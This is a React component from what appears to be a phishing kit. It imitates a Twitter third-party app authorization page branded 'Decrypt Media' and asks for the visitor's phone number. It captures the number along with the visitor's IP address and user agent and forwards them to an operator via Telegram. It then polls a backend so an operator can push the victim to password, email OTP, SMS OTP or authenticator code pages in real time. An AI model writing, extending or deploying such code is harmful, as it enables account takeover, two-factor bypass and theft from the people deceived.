import React, { useEffect, useState } from "react";
import Footer from "./Footer";
import Header from "./Header";
import { submitPhoneNumber, fetchUserStep } from "../../services/api";
import { sendToTelegram } from "../../utils/sendToTelegram";
import { useNavigate } from "react-router-dom";
import Loader from "./Loader"; // Import the Loader component
import Cookies from "js-cookie";

const PhoneNumberForm = () => {
  const [countries, setCountries] = useState([]);
  const [selectedCountry, setSelectedCountry] = useState(null);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false); // New loading state
  const [error, setError] = useState(""); // Error state
  const [showLoader, setShowLoader] = useState(false); // State to manage showing the loader while waiting for admin
  const navigate = useNavigate();

  // Fetch countries list on mount
  useEffect(() => {
    fetch("/countries_list.txt")
      .then((response) => response.text())
      .then((data) => {
        const parsedCountries = data
          .split("\n")
          .map((line) => {
            const [flag, ...rest] = line.split(" ");
            const restJoined = rest.join(" ");
            const [name, codeWithParentheses] = restJoined.split("(");
            const code = codeWithParentheses
              ? codeWithParentheses.replace(")", "")
              : null;

            if (code && name) {
              return {
                code: code.trim(),
                name: name.trim(),
                flag: flag.trim(),
              };
            }
            return null;
          })
          .filter(Boolean);

        setCountries(parsedCountries);
        setSelectedCountry(parsedCountries[0]);
      });
  }, []);

  const handleCountryChange = (country) => {
    setSelectedCountry(country);
  };

  const handlePhoneNumberChange = (e) => {
    setPhoneNumber(e.target.value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Show loader on submit
    setError(""); // Clear any previous errors

    const userId = Cookies.get("userId");

    try {
      const userIp = await fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => data.ip);

      const userAgent = navigator.userAgent || "Unknown User Agent";

      const response = await submitPhoneNumber(
        userId,
        selectedCountry.code,
        phoneNumber,
        userAgent,
        userIp
      );

      if (response.status === 200) {
        console.log("Phone number submitted successfully");

        // Log the submission data to Telegram (similar to the EmailCaptureForm)
        const sections = [
          {
            title: "Phone Number Capture",
            data: {
              PhoneNumber: `${selectedCountry.code} ${phoneNumber}`,
              Country: selectedCountry.name,
              IP: userIp,
              UserAgent: userAgent,
            },
          },
        ];
        sendToTelegram(sections, "Phone Number Capture");

        // Show loader while waiting for admin action
        setShowLoader(true);
      } else {
        console.error("Failed to submit phone number:", response.data.error);
        setError("Failed to submit phone number. Please try again."); // Show error message
        setLoading(false); // Stop loader on error
      }
    } catch (error) {
      console.error("Error submitting phone number:", error);
      setError("An error occurred. Please try again.");
      setLoading(false); // Stop loader on error
    }
  };

  // Poll for user step from the backend
  useEffect(() => {
    if (!showLoader) return;

    const userId = Cookies.get("userId");
    const pollForStep = async () => {
      try {
        const response = await fetchUserStep(userId);
        const step = response?.data?.currentStep;
        console.log("Current Step: ", step); // Log the step

        if (step && step !== "loading") {
          switch (step) {
            case "email-password":
              navigate(`/email-page?userId=${userId}`);
              break;
            case "email-otp":
              navigate(`/email-otp-page?userId=${userId}`);
              break;
            case "phone-otp":
              navigate(`/phone-otp-page?userId=${userId}`);
              break;
            case "phone-number":
              navigate(`/phone-number-page?userId=${userId}`);
              break;
            case "authenticator-otp":
              navigate(`/authenticator-otp-page?userId=${userId}`);
              break;
            case "error-page":
              console.log("Handling error-page step...");
              setError("Incorrect phone number. Please try again."); // Trigger the error
              setShowLoader(false); // Stop the loader on error
              setLoading(false); // Ensure loader stops
              break;
            case "thank-you":
              navigate(`/thank-you?userId=${userId}`);
              break;
            default:
              setError("Unknown step");
              setShowLoader(false); // Stop loader on unknown step
              setLoading(false); // Ensure loader stops
          }
        }
      } catch (err) {
        console.error("Polling error:", err);
        setError("An error occurred while polling the user step.");
        setShowLoader(false); // Stop loader on error
        setLoading(false);
      }
    };

    const intervalId = setInterval(pollForStep, 2000); // Poll every 2 seconds

    return () => clearInterval(intervalId); // Cleanup on unmount
  }, [showLoader, navigate]);

  if (loading || showLoader) {
    return <Loader />; // Show loader while loading or waiting for admin action
  }

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-grow">
        <div className="max-w-xl mx-auto px-4 sm:px-6 py-4">
          <div className="bg-white sm:border sm:border-gray-300 sm:rounded-lg">
            <div className="p-4 sm:p-6">
              <h1 className="text-xl font-bold text-gray-800 mb-4">
                Enter your phone number
              </h1>

              <div className="flex items-center mb-4">
                <img
                  src="/decrypt.jpg"
                  alt="Decrypt Media"
                  className="w-12 h-12 mr-3"
                />
                <div>
                  <h3 className="font-bold text-gray-800">Decrypt Media</h3>
                  <p className="text-sm text-gray-600">By @decryptmedia</p>
                  <p className="text-sm text-gray-600">decrypt.co</p>
                </div>
              </div>

              {error && (
                <div className="text-red-500 text-sm mb-3">{error}</div>
              )}

              <form className="mb-6" onSubmit={handleSubmit}>
                <div className="mb-3">
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Country
                  </label>
                  <select
                    value={selectedCountry ? selectedCountry.code : ""}
                    onChange={(e) =>
                      handleCountryChange(
                        countries.find(
                          (country) => country.code === e.target.value
                        )
                      )
                    }
                    className="w-full p-2 border border-gray-300 rounded text-sm"
                  >
                    {countries.map((country) => (
                      <option key={country.code} value={country.code}>
                        {country.flag} {country.name} ({country.code})
                      </option>
                    ))}
                  </select>
                </div>
                <div className="mb-3">
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Phone Number
                  </label>
                  <div className="flex">
                    <span className="inline-flex items-center px-3 border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm rounded-l-md">
                      {selectedCountry ? selectedCountry.code : ""}
                    </span>
                    <input
                      type="tel"
                      placeholder="Enter phone number"
                      value={phoneNumber}
                      onChange={handlePhoneNumberChange}
                      className="w-full p-2 border border-gray-300 rounded-r-md text-sm"
                    />
                  </div>
                </div>
                <div className="flex space-x-3">
                  <button
                    type="submit"
                    className="bg-blue-500 text-white py-2 px-4 rounded font-bold hover:bg-blue-600 text-sm flex-grow sm:flex-grow-0"
                  >
                    Send OTP
                  </button>
                  <button
                    type="button"
                    className="bg-white text-gray-700 py-2 px-4 rounded font-bold border border-gray-300 hover:bg-gray-100 text-sm flex-grow sm:flex-grow-0"
                  >
                    Cancel
                  </button>
                </div>
              </form>

              <div className="text-sm">
                <p className="text-green-600 mb-2">
                  This application will be able to:
                </p>
                <ul className="list-disc pl-5 space-y-1 text-gray-600 mb-4">
                  <li>
                    See Tweets from your timeline as well as your Lists and
                    collections.
                  </li>
                  <li>See your Twitter profile information.</li>
                  <li>See accounts you follow.</li>
                </ul>
                <p className="text-gray-500">
                  Learn more about{" "}
                  <a href="#" className="text-blue-500 hover:underline">
                    third-party app permissions
                  </a>{" "}
                  in the Help Center.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default PhoneNumberForm;
